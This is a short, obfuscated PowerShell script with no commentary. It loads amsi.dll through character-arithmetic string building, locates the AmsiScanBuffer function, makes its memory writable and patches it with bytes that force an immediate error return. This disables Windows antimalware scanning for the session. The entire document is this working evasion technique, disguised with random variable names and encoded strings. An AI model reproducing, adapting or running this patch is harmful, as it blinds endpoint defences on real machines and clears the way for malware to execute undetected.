$x33JSfDI09Z3C65Is = @"
using System;
using System.Runtime.InteropServices;
public class x33JSfDI09Z3C65Is {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr AhQiNnfmw, string u1tSHLS);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr sh7gi, UIntPtr XPuxFlZ9X, uint Ur5FO9P, out uint f_S9jycPZPe4xI5YU);
}
"@

Add-Type $x33JSfDI09Z3C65Is

$sq7qT = [x33JSfDI09Z3C65Is]::LoadLibrary("$([chAR](97+14-14)+[cHAr]([byte]0x6d)+[ChAR](115*54/54)+[ChAR](105*50/50)+[Char](35+11)+[ChAR](19+81)+[CHaR](63+45)+[Char](9+99))")
$JQtVaxS58qVN3X = [x33JSfDI09Z3C65Is]::GetProcAddress($sq7qT, "$(('ÀmsîS'+'cânBû'+'ffêr').NormaLiZE([chAR](70+33-33)+[CHAR](111+39-39)+[chAR]([byTE]0x72)+[cHAr]([BYTe]0x6d)+[CHAR]([BYtE]0x44)) -replace [Char]([byte]0x5c)+[chAr]([BYte]0x70)+[CHAR]([BYtE]0x7b)+[chaR]([ByTE]0x4d)+[CHAR](110*108/108)+[ChAr](125))")
$p = 0
[x33JSfDI09Z3C65Is]::VirtualProtect($JQtVaxS58qVN3X, [uint32]5, 0x40, [ref]$p)
$duAK2N8L1l_hrsyR8PA4 = "0xB8"
$Ei1kwO_N1T = "0x57"
$Tcn0 = "0x00"
$iZ4SjjfMZJ = "0x07"
$XSXlG0bKu_g = "0x80"
$uEo22RDQFo7_ = "0xC3"
$Lxuskb8tnB11ma7 = [Byte[]] ($duAK2N8L1l_hrsyR8PA4,$Ei1kwO_N1T,$Tcn0,$iZ4SjjfMZJ,+$XSXlG0bKu_g,+$uEo22RDQFo7_)
[System.Runtime.InteropServices.Marshal]::Copy($Lxuskb8tnB11ma7, 0, $JQtVaxS58qVN3X, 6)